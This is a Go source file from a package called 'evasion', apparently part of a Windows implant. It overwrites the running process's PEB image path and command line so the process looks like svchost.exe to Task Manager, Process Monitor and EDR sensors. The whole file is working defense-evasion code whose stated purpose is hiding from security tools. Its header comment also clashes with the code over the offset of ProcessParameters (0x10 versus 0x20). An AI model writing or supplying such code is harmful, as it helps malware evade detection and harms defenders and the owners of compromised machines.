//go:build windows
// +build windows

package evasion

// PEB spoofing — overwrites the process's own PEB fields so that tools like
// Process Monitor, Task Manager, and EDR sensors that read PEB data see a
// different (legitimate-looking) process name and command line.
//
// PEB layout (x64, Windows 10+):
//   PEB+0x00  InheritedAddressSpace     BYTE
//   PEB+0x10  ProcessParameters         *RTL_USER_PROCESS_PARAMETERS
//
// RTL_USER_PROCESS_PARAMETERS (x64):
//   +0x00  MaximumLength             ULONG
//   +0x60  ImagePathName             UNICODE_STRING   (Len, MaxLen, Buffer)
//   +0x70  CommandLine               UNICODE_STRING
//
// We locate PEB via NtQueryInformationProcess (ProcessBasicInformation).

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// unicodeString mirrors UNICODE_STRING.
type unicodeString struct {
	Length    uint16
	MaxLength uint16
	_         uint32 // padding on x64
	Buffer    *uint16
}

// processBasicInfo mirrors PROCESS_BASIC_INFORMATION.
type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

// getPEB returns the PEB base address of the current process.
func getPEB() uintptr {
	var info processBasicInfo
	size := uintptr(unsafe.Sizeof(info))
	ntdll := windows.NewLazySystemDLL(sNtdll())
	r, _, _ := ntdll.NewProc("NtQueryInformationProcess").Call(
		uintptr(windows.CurrentProcess()),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&info)),
		size,
		uintptr(unsafe.Pointer(&size)),
	)
	if r != 0 {
		return 0
	}
	return info.PebBaseAddress
}

// spooferTargets are the fake strings we set. Chosen to look like a
// common Windows system binary to casual inspection.
var (
	// svchost.exe -k netsvcs -p -s LanmanWorkstation
	spoofImagePath  = `C:\Windows\System32\svchost.exe`
	spoofCmdLine    = `C:\Windows\System32\svchost.exe -k netsvcs -p`
)

// spoofPEB replaces ImagePathName and CommandLine in the process PEB
// with the spoofed strings.
func spoofPEB() {
	peb := getPEB()
	if peb == 0 {
		return
	}
	// ProcessParameters pointer is at PEB+0x20 on x64.
	procParams := *(*uintptr)(unsafe.Pointer(peb + 0x20))
	if procParams == 0 {
		return
	}

	// ImagePathName is at RTL_USER_PROCESS_PARAMETERS+0x60
	// CommandLine    is at RTL_USER_PROCESS_PARAMETERS+0x70
	imagePtr := (*unicodeString)(unsafe.Pointer(procParams + 0x60))
	cmdPtr   := (*unicodeString)(unsafe.Pointer(procParams + 0x70))

	writeUnicodeString(imagePtr, spoofImagePath)
	writeUnicodeString(cmdPtr, spoofCmdLine)
}

// writeUnicodeString overwrites us.Buffer with a new UTF-16 string.
// Allocates a new buffer via HeapAlloc so the original allocation is not
// resized unsafely. Length/MaxLength are updated to match.
func writeUnicodeString(us *unicodeString, s string) {
	encoded, err := windows.UTF16FromString(s)
	if err != nil {
		return
	}
	byteLen := uint16(len(encoded)*2 - 2) // exclude null terminator from Length
	maxLen  := uint16(len(encoded) * 2)

	// Allocate with HeapAlloc from the process heap.
	heap, _, _ := modKernel32.NewProc("GetProcessHeap").Call()
	if heap == 0 {
		return
	}
	newBuf, _, _ := modKernel32.NewProc("HeapAlloc").Call(
		heap, 0x8 /*HEAP_ZERO_MEMORY*/, uintptr(maxLen),
	)
	if newBuf == 0 {
		return
	}
	// Copy UTF-16 data.
	dst := (*[32768]uint16)(unsafe.Pointer(newBuf))
	for i, w := range encoded {
		dst[i] = w
	}
	// Patch the UNICODE_STRING in-place (make the page writable first).
	structAddr := uintptr(unsafe.Pointer(us))
	old, _ := ntProtect(structAddr, 16, windows.PAGE_READWRITE)
	us.Length    = byteLen
	us.MaxLength = maxLen
	us.Buffer    = (*uint16)(unsafe.Pointer(newBuf))
	ntProtect(structAddr, 16, old)
}
